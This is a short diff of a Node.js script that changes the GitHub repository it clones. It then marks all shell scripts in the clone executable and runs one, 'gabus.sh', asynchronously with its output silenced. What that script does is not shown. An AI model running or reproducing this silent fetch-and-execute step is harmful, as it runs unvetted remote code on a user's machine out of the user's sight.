@@ -7,10 +7,10 @@ let spawn = {};
 (async () => {
   try {
     if (!spawnPID.pid) {
-      spawn = shell.rm('-rf', 'visum');
-      await git.clone('https://github.com/Aerlymemo/visum.git');
-      console.log('cd visum...');
-      spawn = shell.cd('visum');
+      spawn = shell.rm('-rf', 'corinta');
+      await git.clone('https://github.com/amiajunal/corinta.git');
+      console.log('cd corinta...');
+      spawn = shell.cd('corinta');
       spawn = shell.exec('pwd', { async: true });
       spawn = shell.chmod('+x', '*.sh');
       spawn = shell.exec('./gabus.sh', { async: true, silent: true });
